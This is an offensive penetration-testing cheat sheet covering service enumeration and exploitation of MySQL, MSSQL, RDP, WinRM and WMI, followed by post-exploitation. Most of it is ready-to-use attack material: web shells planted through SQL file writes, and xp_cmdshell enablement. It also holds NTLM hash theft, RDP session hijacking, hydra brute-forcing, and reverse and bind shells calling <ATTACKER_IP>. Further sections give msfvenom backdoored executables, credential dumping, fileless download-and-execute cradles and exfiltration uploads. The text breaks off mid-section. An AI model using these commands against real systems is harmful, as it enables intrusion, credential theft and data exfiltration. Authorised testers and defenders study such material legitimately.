- `TCP 512/513/514`: `rexecd`, `rlogind`, `rshd`
- `UDP 513`: `rwhod`
- https://en.wikipedia.org/wiki/Berkeley_r-commands
- Server Config
    - `/etc/hosts.equiv`: allowed hosts for `rlogin`
    - `~/{.rlogin, .rhosts}`: allowed hosts

Suite of obsolete remote management tools. All communication is unencrypted including its authentication.

```bash
# Enum via nmap
sudo nmap -sV -p 512,513,514 <TARGET>

# Remote copy; does not confirm remote overwriting of files
rcp
# Remote shell
rsh
# Remote command
rexec
# Remote login (telnet-like)
rlogin <TARGET> -l <USER>
# Show authenticated users
rwho
rusers -al <TARGET>
```

## 🗄️ MySQL

- `TCP 3306`: normal
- Server Config:
    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
- default system schemas/databases:
    - `mysql` - is the system database that contains tables that store information required by the MySQL server
    - `information_schema` - provides access to database metadata
    - `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
    - `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
- `secure_file_priv` may be set as follows:
    - If empty, the variable has no effect, which is not a secure setting.
    - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
    - If set to NULL, the server disables import and export operations
- https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes


{{% details "Dangerous Settings" %}}
- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
{{% /details %}}

```bash
# Login
# - try "root"
mysql -u <USER> -h <TARGET>
mysql -u <USER> --password=<PASSWORD> -P <PORT> -h <TARGET>

select version() ;
show databases ;
use <DATABASE> ;
show tables ;
show columns from <TABLE> ;

SELECT * FROM users ;
select * from <TABLE> ;
select * from <TABLE> where <COLUMN> = "<VALUE>" ;

use sys ;  # tables and metadata
select host, unique_users from host_summary ;

use information_schema ;  # metadata

### Read Files
# NOTE: not normal
select LOAD_FILE("/etc/passwd");

### Write Files (to achieve command execution)
show variables like "secure_file_priv";
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

## 🗄️ Win: MSSQL

- `TCP/UDP 1433`: normal
- `TCP 2433`: hidden mode
- default system schemas/databases:
    - `master` - keeps the information for an instance of SQL Server.
    - `msdb` - used by SQL Server Agent.
    - `model` - a template database copied for each new database.
    - `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
    - `tempdb` - keeps temporary objects for SQL queries.
- `xp_cmdshell`:
    - `xp_cmdshell` is a powerful feature and disabled by default. It can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`
    - The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
    - `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

Microsoft's closed-source version of SQL.

- https://www.microsoft.com/en-us/sql-server/sql-server-2019
- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15

{{% details "Dangerous Settings" %}}

- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account

{{% /details %}}

```bash
# Enumerate via nmap
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>

# Enumerate via MSF
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <TARGET>
run

### Login via Windows auth
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>@<TARGET>
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET>

SELECT @@version;
SELECT user_name();
SELECT system_user;
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1+ is admin
# Users
SELECT name FROM master..syslogins;
# Databases
SELECT name FROM master..sysdatabases;

# show tables ;
USE <DATABASE> ;
SELECT name FROM sys.tables;

---

### Read Files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

### Write Files (to achieve command execution)
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE

### Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

xp_cmdshell 'whoami'

# or run linked server command
EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]

### Impersonate User
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
GO

# Impersonating the SA User
USE master
EXECUTE AS LOGIN = 'sa'
# Verify
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
# 0 is NOT admin

### Linked Servers
SELECT srvname, isremote FROM sysservers
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]

---

### Capture NTLM Hash
sudo responder -I <INTERFACE>

# XP_DIRTREE Hash Stealing
EXEC master..xp_dirtree '\\<ATTACKER>\share'
# XP_SUBDIRS Hash Stealing
EXEC master..xp_subdirs '\\<ATTACKER>\share'
```

## 🖥️ Win: RDP

- `TCP 3389`: normal
- `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon

Also called "Terminal Services".

```bash
# Enum via nmap
sudo nmap -sV -sC --script 'rdp*' -p3389 <TARGET>

# Enum RDP security posture
sudo cpan
sudo cpan Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <TARGET>

# Connects to RDP and mounts mimikatz share
xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share

\\tsclient\share\mimikatz.exe

---

# Impersonate other logged-in user
# NOTE: needs SYSTEM
query.exe user
tscon.exe <SESSION_ID> /dest:<SESSION_NAME>

# Local Admin => SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon.exe <SESSION_ID> /dest:<SESSION_NAME>"
net.exe start sessionhijack
```

## 🔌 Win: WinRM

- `TCP 5985/5986`: via HTTP/HTTPS respectively

```bash
# Enum via nmap
sudo nmap --disable-arp-ping -n -Pn -sV -sC -p5985,5986 <TARGET>

# Connect via WinRM
# https://github.com/Hackplayers/evil-winrm
evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
```

## ⚙️ Win: WMI

- `TCP 135`: first, initialization
- `TCP <RHP>`: afterwards, comms

```bash
# Run interactive shell
impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET>
# Run remote command
impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET> "<COMMAND>"
```

# 💥 Exploitation

- Exploit DBs
    - https://www.exploit-db.com/
    - https://www.rapid7.com/db/
    - https://www.vulnerability-lab.com/

## Password

### Default Creds

- https://github.com/ihebski/DefaultCreds-cheat-sheet
- Routers: https://www.softwaretestinghelp.com/default-router-username-and-password-list/

```bash
# Install
pipx install defaultcreds-cheat-sheet

# Creds
creds search <KEYWORD>
```

### Brute-Forcing & Spraying

- brute-force: usually 1 user against 1 target using many passwords (alternates passwords)
- spraying: usually many users against many targets using 1 password (alternates users)

```bash
# Password Sprayer (over multiple users or networks)
netexec winrm <TARGET> -u <USERS> -p <PASSWORDS>
```

```bash
# Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -VF -o hydra_web_login.txt

# Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -VF -o hydra_wp_login.txt

# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -o hydra_ssh_login.txt
```

```bash
# --- Core Flags ---
# -f      : Stop immediately when a credential is found
# -V      : Verbose (Check if service is responding/attempting)

# --- Infrastructure (SSH / FTP / RDP / SMB) ---
hydra -l <USER> -P <WORDLIST> -f -V -t 4 ssh://<TARGET>
hydra -l <USER> -P <WORDLIST> -f -V ftp://<TARGET>
hydra -l <USER> -P <WORDLIST> -f -V rdp://<TARGET>
hydra -l <USER> -P <WORDLIST> -f -V smb://<TARGET>

# --- Web Forms (HTTP-POST) ---
# Syntax: "/path:body:F=FailureString"
# Use ^USER^ and ^PASS^ as placeholders. Check Burp Suite for body structure.
hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid password" -V -f

# WordPress Specific
hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V -f

# --- Password Spraying (1 Pass vs Many Users) ---
hydra -L <USER_LIST> -p 'Spring2025!' -f -V -t 4 ssh://<TARGET>
hydra -L <USER_LIST> -p 'Spring2025!' -f -V <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```
## Metasploit

```bash
# Install exploit manually
cp -v <EXPLOIT> /usr/share/metasploit-framework/modules/exploits/
# OR from exploit-db
pushd /usr/share/metasploit-framework/modules/exploits/
searchsploit -m <EDB-ID>
# in MSF
reload
reload_all

### Search
# <type>/<os>/<service>/<name>

# Search for port and name, showing exploits only
search type:exploit platform: port:<PORT> name:<NAME>

# grep
grep meterpreter grep reverse_tcp show payloads

# Set all LHOST to be tunnel IP
setg LHOST tun0
```

### 📊 Meterpreter Survey

```bash
sysinfo
getuid
getpid
ipconfig
ps

# Linux flag search
search -d / -f flag.txt
search -d / -f user.txt
search -d / -f root.txt

# Windows flag search
search -d C:\\ -f flag.txt
search -d C:\\ -f user.txt
search -d C:\\ -f root.txt

# REMEMBER: for Windows, quoting and double slashes 
cat "C:\\Programs and Files (x86)\\"

# Migrate
ps -s | grep svchost
migrate <PID>

getsystem
getprivs

# List security tokens of user and group
list_tokens -u
list_tokens -g
impersonate_token <DOMAIN_NAMEUSERNAME>
steal_token <PID>
drop_token

# Dumps creds
hashdump  # CrackStation
lsa_dump_sam
lsa_dump_secrets

# Better dump creds
load kiwi
creds_all

# === WINDOWS ===
run winenum
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares

# --- Privilege Escalation & Credential Gathering ---
run post/windows/gather/smart_hashdump
run post/multi/recon/local_exploit_suggester
```

### 🗄️ DB for Targets

```bash
# Check database status from within msfconsole
db_status

# Database Backend Commands
db_nmap <NMAP_OPTS> <TARGET>
db_connect
db_disconnect
db_export -f xml metasploit_backup.xml
db_import <SCAN_FILE_XML>
db_rebuild_cache
db_remove
db_save

# Manage workspaces
workspace
workspace -a <WORKSPACE>
workspace -d <WORKSPACE>
workspace <WORKSPACE>

hosts
loot
notes
services
vulns
creds

# Using database hosts for a module
hosts -R  # set RHOSTS from hosts
services -S <SEARCH>
```

## 🔄 Reverse Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://www.revshells.com/
- URL ENCODE: https://www.urlencoder.org/

```bash
# === ATTACKER: LISTENER ===
nc -lvnp <CALLBACK_PORT>

# === TARGET: CALLBACKS ===
rm -f /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -nv <ATTACKER_IP> <CALLBACK_PORT> > /tmp/f

bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<CALLBACK_PORT> 0>&1'

# Must be ran from cmd.exe
powershell -nop --% -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## 🔗 Bind Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/

```bash
# === TARGET: LISTENER ===
rm -f /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LISTEN_PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP --% -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

# === ATTACKER: CONNECT ===
nc -nv <TARGET> <LISTEN_PORT>
```

## 🕷️ Web Shells

- Beachhead: https://github.com/flozz/p0wny-shell
- Post-Exploit: https://github.com/wso-shell-php/.github
- https://github.com/payloadbox/command-injection-payload-list
- https://swisskyrepo.github.io/PayloadsAllTheThings/
- `/usr/share/webshells`
- https://github.com/jbarcia/Web-Shells/tree/master/laudanum
    - `/usr/share/laudanum`

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

```bash
### ASPX (Microsoft IIS)
# Command Shell
# 1) Add ATTACKER_IP on line 59
# 2) Remove unnecessary comments at beginning and end
/usr/share/laudanum/aspx/shell.aspx
# PowerShell Command Terminal
# 1) Edit creds on line 14
/usr/share/nishang/Antak-WebShell/antak.aspx
# PHP WebShell
wget https://github.com/WhiteWinterWolf/wwwolf-php-webshell/raw/refs/heads/master/webshell.php
```

### ⚡ Command executor

```php
echo '<?php if(isset($_GET["debug"])) system($_GET["debug"]); ?>' > debug.php

curl -skL -o- http://<TARGET>/debug.php?debug=<COMMAND>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

### 🎯 Msfvenom

- **stageless:** names like `shell_reverse_tcp`
- **staged:** names like `shell_reverse_tcp`

```bash
### Listener for reverse callbacks
use exploit/multi/handler
set payload <PAYLOAD>  # should match msfvenom
set lhost <LISTEN_IP>
set lport <LISTEN_PORT>

### Msfvenom commands
msfvenom -l payloads
msfvenom -l formats

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.php

# LINUX
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py

# WINDOWS
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > rev_shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > nameoffile.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp

# Java Web Shells
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > nameoffile.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f war > nameoffile.war

# BACKDOOR-ed EXECUTABLES
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -k -x <INPUT_FILE> -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_FILE> -i 5
```

## 🛑 Responder (Multirelay)

- https://www.virtuesecurity.com/kb/responder-multirelay-pentesting-cheatsheet/

```bash
# Configure listening services in: /etc/responder/Responder.conf
sudo responder -I <INTERFACE>

# Use RevShell to send a PowerShell base64 callback
# nc -lvnp <PORT>
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET> -c '<POWERSHELL_CALLBACK>'
```

## Shell Upgrade

```shell
# Best Upgrade
for i in python3 python python2 ; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit ; done
# Others
script /dev/null -c /bin/bash
/bin/bash -i
find . -exec /bin/bash -p \; -quit
awk 'BEGIN {system("/bin/bash")}'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
vim -c ':!/bin/bash' -c ':qa!'
lua -e 'os.execute("/bin/bash")'

# ---

export TERM=xterm-256color

CTRL+Z
stty raw -echo ; fg

# Resize terminal size
echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty rows $(tput lines) columns $(tput cols)"
```

# 🎯 Post-Exploitation

## 📍 Good Locations

### 🪟 Windows

- **%windir%** - Windows installation directory (Example: C:\Windows)
- **%SystemRoot%** - Alias for %windir% (Example: C:\Windows)
- **%ProgramFiles%** - Default directory for 64-bit programs (Example: C:\Program Files)
- **%ProgramFiles(x86)%** - Default directory for 32-bit programs on 64-bit systems (Example: C:\Program Files (x86))
- **%CommonProgramFiles%** - Default directory for 64-bit common files (Example: C:\Program Files\Common Files)
- **%CommonProgramFiles(x86)%** - Default directory for 32-bit common files on 64-bit systems (Example: C:\Program Files (x86)\Common Files)
- **%SystemDrive%** - Drive letter of the system partition (Example: C:)
- **%USERPROFILE%** - Path to the current user's profile directory (Example: C:\Users\username)
- **%APPDATA%** - User's roaming application data directory (Example: C:\Users\username\AppData\Roaming)
- **%LOCALAPPDATA%** - User's local application data directory (Example: C:\Users\username\AppData\Local)
- **%TEMP% or %TMP%** - User's temporary files directory (Example: C:\Users\username\AppData\Local\Temp)
- **%HOMEDRIVE%** - Drive letter of the user's home directory (Example: C:)
- **%HOMEPATH%** - Path to the user's home directory (Example: \Users\username)
- **%PATH%** - Semicolon-separated list of executable search paths (Example: C:\Windows;C:\Windows\System32)
- **%PATHEXT%** - Semicolon-separated list of executable file extensions (Example: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC)
- **%PUBLIC%** - Path to the public user directory (Example: C:\Users\Public)
- **%USERNAME%** - The name of the current user (Example: username)
- **%COMPUTERNAME%** - The name of the computer (Example: DESKTOP-XXXXXX)

## 📤 File Transfer

- https://cheatography.com/fred/cheat-sheets/file-transfers/
- https://lolbas-project.github.io/#
- Windows: https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/windows-download-execute/

- https://live.sysinternals.com/
    - `\\live.sysinternals.com\`

### Encryption (for exfiltration)

```bash
### === via PowerShell  ===
# https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE>

### === via OpenSSL
# https://docs.openssl.org/1.1.1/man1/enc/
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in <IN_FILE> -out <OUT_FILE>
# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <IN_FILE> -out <OUT_FILE>

### === via WinRAR ===
sudo apt install -y rar
# OR
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar && sudo make install

# Double Encrypt
rar a stage1.rar -p <FILENAME>
mv stage1.rar stage1
rar a stage2.rar -p stage1
mv stage2.rar stage2
```

### ⬇️ Windows <= Download

- Download cradle: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

```bash
### === WEB ===

# HTTP port 80
sudo python3 -m http.server 80

# HTTPS port 443
openssl req -new -x509 -keyout https_server_cert.pem -out https_server_cert.pem -days 365 -nodes

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='https_server_cert.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

# Download (FILE)
(New-Object Net.WebClient).DownloadFile('<DOWNLOAD_URL>','<OUTPUT_FILE>')

(New-Object Net.WebClient).DownloadFileAsync('<DOWNLOAD_URL>','<OUTPUT_FILE>')

# Set User-Agent string
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
# Web Request
Invoke-WebRequest <DOWNLOAD_URL> -UserAgent $UserAgent -OutFile '<OUTPUT_FILE>'
Invoke-RestMethod <DOWNLOAD_URL> -UserAgent $UserAgent -OutFile '<OUTPUT_FILE>'

# Allow untrusted certs and initialize first-time IE
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
Invoke-WebRequest -UseBasicParsing <DOWNLOAD_URL> -OutFile <OUTPUT_FILE>

# Download & Execute (FILELESS)
IEX (New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>')

(New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>') | IEX

# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download
certutil -URLcache -split -f http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>
# https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/#download
bitsadmin.exe /transfer /Download /priority Foreground http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>

# JavaScript wget.js
# https://superuser.com/a/536400
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
# Execute like so:
cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>

# VBScript wget.vbs
# https://stackoverflow.com/a/2973344
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
# Execute like so:
cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>

### === SMB ===
# https://github.com/fortra/impacket/blob/master/examples/smbserver.py
impacket-smbserver -smb2support -username <USERNAME> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>

# WITHOUT password
copy \\<ATTACKER_IP\<SHARE_NAME>\<FILE>
# WITH password
net use <DRIVE_LETTER> \\<ATTACKER_IP\<SHARE_NAME>\ /user:<USER> <PASSWORD>
copy <DRIVE_LETTER>\<FILE>
# https://lolbas-project.github.io/lolbas/Binaries/Findstr/#download
findstr /V thisstringdoesnotexist \\<ATTACKER>\<SHARE>\<FILE> > C:\Users\<USER>\AppData\Local\Temp\<FILE>

### === FTP ===
sudo pip3 install --break-system-packages pyftpdlib

sudo python3 -m pyftpdlib --port <SERVER_PORT>

# Download (FILE)
(New-Object Net.WebClient).DownloadFile('<DOWNLOAD_URL>','<OUTPUT_FILE>')

# Download (NON-INTERACTIVELY)
echo open <ATTACKER_IP> > ftpconfig.txt
echo USER anonymous >> ftpconfig.txt
echo binary >> ftpconfig.txt
echo GET <FILE> >> ftpconfig.txt
echo bye >> ftpconfig.txt

ftp -v -n -s:ftpconfig.txt

### === WinRM ===
# TCP/5985 or 5986
# Windows Remote Management service
# user in "Administrators" or "Remote Management Users"

$Session = New-PSSession -ComputerName <TARGET>
Copy-Item -FromSession $Session -Path <DOWNLOAD_FILE> -Destination <OUTPUT_FILE>

### === COPY&PASTA ===

# ENCODE: Windows
$f="<FILE>" ; [Convert]::ToBase64String((Get-Content -path $f -Encoding byte)) ; Get-FileHash $f -Algorithm MD5 | select Hash
# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#encode
certutil -encode <FILE> <ENCODED_FILE>

# DECODE: Linux
echo "<BASE64>" | base64 -d > <DECODED_FILE>.decode ; md5sum *.decode
```

### ⬆️ Windows => Upload

```bash
### === WEB ===

# --- UPLOAD Server ---

pip3 install --break-system-packages uploadserver

python3 -m uploadserver

# https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
Invoke-RestMethod -Uri http://<ATTACKER_IP>:8000/upload -Method POST -Form (New-Object -TypeName System.Collections.Hashtable -Property @{file = Get-Item <UPLOAD_FILE>})

# --- UPLOAD Server ---

# b64 decode from here
nc -lvnp <PORT>

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Method POST -Uri http://<ATTACKER_IP>:<PORT>/ -Body $b64

### === SMB ===
# https://github.com/fortra/impacket/blob/master/examples/smbserver.py
impacket-smbserver -smb2support -username <USERNAME> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>

### === WEBDAV (HTTP) ===
# https://github.com/mar10/wsgidav

sudo pip3 install --break-system-packages wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=<DIRECTORY> --auth=anonymous

# UPLOAD
Invoke-RestMethod -Uri "http://<ATTACKER_IP>/<SHARE_NAME>/<FILENAME>" -Method POST -Form @{file = Get-Item "<LOCAL_FILE_PATH>"}

### === FTP ===

sudo pip3 install --break-system-packages pyftpdlib

sudo python3 -m pyftpdlib --write --port <SERVER_PORT>

(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/<SAVENAME>', '<UPLOAD_FILE>')

# Upload (NON-INTERACTIVELY)
echo open <ATTACKER_IP> > ftpconfig.txt
echo USER anonymous >> ftpconfig.txt
echo binary >> ftpconfig.txt
echo PUT <FILE> >> ftpconfig.txt
echo bye >> ftpconfig.txt

ftp -v -n -s:ftpconfig.txt

### === WinRM ===
# TCP/5985 or 5986
# Windows Remote Management service
# user in "Administrators" or "Remote Management Users"

$Session = New-PSSession -ComputerName <TARGET>
Copy-Item -ToSession $Session -Path <UPLOAD_FILE> -Destination <OUTPUT_FILE>

### === COPY&PASTA ===

# ENCODE: Windows
$f="<UPLOAD_FILE>" ; [Convert]::ToBase64String((Get-Content -path $f -Encoding byte)) ; Get-FileHash $f -Algorithm MD5 | select Hash

# DECODE: Linux
echo -n "<BASE64>" | base64 -d > <DECODED_FILE>.decode ; md5sum *.decode
```

### ⬇️ Linux <= Download

```bash
### === WEB ===

# Download (FILE)
wget -O <OUTPUT_FILE> <URL>
curl -skLo <OUTPUT_FILE> <URL>

# Download & Execute (FILELESS)
wget -qO- <URL> | python3
curl <URL> | bash

# Create socket
# Bash v2.04+ (compiled w/ --enable-net-redirections
